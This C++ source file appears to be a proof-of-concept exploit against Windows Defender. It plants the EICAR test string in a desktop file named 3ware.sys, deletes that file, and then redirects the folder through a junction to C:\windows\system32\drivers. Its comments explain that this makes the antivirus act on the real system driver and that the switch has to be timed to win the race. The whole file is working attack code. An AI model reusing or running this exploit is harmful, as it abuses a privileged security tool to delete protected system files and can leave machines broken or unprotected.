#include "stdafx.h"
#include "comdef.h"
#include "ReparsePoint.h"
#include <iostream>
#include "FileOpLock.h"
#include "shlobj.h"
#include "Shlwapi.h"
using namespace std;
#pragma comment(lib, "Shlwapi.lib")


LPWSTR GetProfileDirectory()
{
	LPWSTR lpRet = nullptr;

	SHGetKnownFolderPath(FOLDERID_Profile, 0, nullptr, &lpRet);

	

	return lpRet;
}

int _tmain()
{


	std::wstring mywstring(GetProfileDirectory());
	std::wstring concatted_stdstr = mywstring + L"\\desktop\\eicar";
	LPCWSTR path1 = concatted_stdstr.c_str();
	
	//Make sure to remove the path first, should it be still there from a previous run.
	RemoveDirectory(path1);
	Sleep(1000);


	CreateDirectory(path1, NULL);

	HANDLE hFile;
	char DataBuffer[] = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";
	DWORD dwBytesToWrite = (DWORD)strlen(DataBuffer);
	DWORD dwBytesWritten = 0;
	BOOL bErrorFlag = FALSE;

	concatted_stdstr = mywstring + L"\\desktop\\eicar\\3ware.sys";
	LPCWSTR path2 = concatted_stdstr.c_str();

	hFile = CreateFile(path2,
		GENERIC_WRITE,          
		FILE_SHARE_READ,                      
		NULL,                   
		CREATE_NEW,             
		FILE_ATTRIBUTE_NORMAL,  
		NULL);                 

	bErrorFlag = WriteFile(
		hFile,           
		DataBuffer,     
		dwBytesToWrite,  
		&dwBytesWritten, 
		NULL);           

	CloseHandle(hFile);
	Sleep(5000);
	DeleteFile(path2); //Delete our file so we can create a junction to our actual driver
	HANDLE hJunction2 = CreateFile(path1, GENERIC_READ | FILE_WRITE_DATA,
		FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT,
		nullptr);
	ReparsePoint::CreateMountPoint(hJunction2, L"c:\\windows\\system32\\drivers", L"");
	//When we hit this point, windows defender will start looking at the actual 3ware driver :). You need to time this, so the switch happens right before the delete!
	return 0;
}

